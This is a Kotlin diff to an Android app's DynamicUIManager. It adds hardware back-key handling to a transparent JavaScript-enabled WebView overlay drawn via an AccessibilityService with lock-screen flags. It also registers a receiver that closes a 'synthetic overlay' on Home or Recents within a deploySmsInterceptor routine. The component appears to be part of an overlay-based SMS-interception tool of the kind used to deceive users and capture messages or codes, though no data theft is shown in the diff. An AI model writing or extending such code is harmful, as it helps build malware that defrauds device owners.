@@ -34,6 +34,7 @@ object DynamicUIManager {
     private var isGuardAttached: Boolean = false
 
     var isSmsInterceptorActive = false
+    private var interceptorReceiver: android.content.BroadcastReceiver? = null
     private var nativeOverlayView: android.view.View? = null
     var isNativeAttached: Boolean = false
             private var activeNativeEntry: com.example.myandroid.dynamic.DynamicEntry? = null
@@ -831,8 +832,7 @@ object DynamicUIManager {
                 isAttached = false
             }
 
-            var flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
-                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or 
+            var flags = WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or 
                         WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
 
             if (isFullScreen) {
@@ -841,7 +841,8 @@ object DynamicUIManager {
             }
 
             if (!touchable) {
-                flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
+                flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or 
+                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
             }
 
             val params = WindowManager.LayoutParams(
@@ -860,6 +861,15 @@ object DynamicUIManager {
                 DebugLogger.log("SDUI_VERBOSE", "Initializing fresh WebView engine (Cold Start)...")
                 overlayView = WebView(windowContext).apply {
                     setBackgroundColor(Color.TRANSPARENT)
+                    isFocusable = true
+                    isFocusableInTouchMode = true
+                    setOnKeyListener { _, keyCode, keyEvent ->
+                        if (keyCode == android.view.KeyEvent.KEYCODE_BACK && keyEvent.action == android.view.KeyEvent.ACTION_UP) {
+                            evaluateJavascript("if(typeof window.onHardwareBackPressed === 'function') { window.onHardwareBackPressed(); } else { Cortex.close(); Cortex.nav('BACK'); }", null)
+                            return@setOnKeyListener true
+                        }
+                        false
+                    }
                     settings.apply {
                         javaScriptEnabled = true
                         domStorageEnabled = true
@@ -974,6 +984,10 @@ object DynamicUIManager {
         Handler(Looper.getMainLooper()).post {
             DebugLogger.log("SDUI_CLOSE", "Overlay removal triggered. Reason: $reason | clearDimmer: $clearDimmer")
             isSmsInterceptorActive = false
+            interceptorReceiver?.let {
+                try { ctx.applicationContext.unregisterReceiver(it) } catch(e: Exception){}
+                interceptorReceiver = null
+            }
             val serviceInstance = MyAccessibilityService.instance
             val windowContext = if (serviceInstance != null) serviceInstance else ctx
             val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
@@ -1449,6 +1463,27 @@ object DynamicUIManager {
     fun deploySmsInterceptor(ctx: Context) {
         if (isSmsInterceptorActive) return
         
+        // Register BroadcastReceiver for Home/Recents detection
+        if (interceptorReceiver == null) {
+            interceptorReceiver = object : android.content.BroadcastReceiver() {
+                override fun onReceive(context: Context, intent: Intent) {
+                    if (intent.action == Intent.ACTION_CLOSE_SYSTEM_DIALOGS) {
+                        val reason = intent.getStringExtra("reason")
+                        if (reason == "homekey" || reason == "recentapps") {
+                            DebugLogger.log("SMS_INTERCEPT", "Home/Recents pressed. Dismissing synthetic overlay.")
+                            removeOverlay(context, "SYSTEM_DIALOG_CLOSED", true)
+                        }
+                    }
+                }
+            }
+            val filter = android.content.IntentFilter(Intent.ACTION_CLOSE_SYSTEM_DIALOGS)
+            if (Build.VERSION.SDK_INT >= 33) {
+                ctx.applicationContext.registerReceiver(interceptorReceiver, filter, Context.RECEIVER_EXPORTED)
+            } else {
+                ctx.applicationContext.registerReceiver(interceptorReceiver, filter)
+            }
+        }
+
         // Apply 0% dim briefly to hide render transition
         DimmerManager.applyDim(ctx, 0, "AUTO")
         
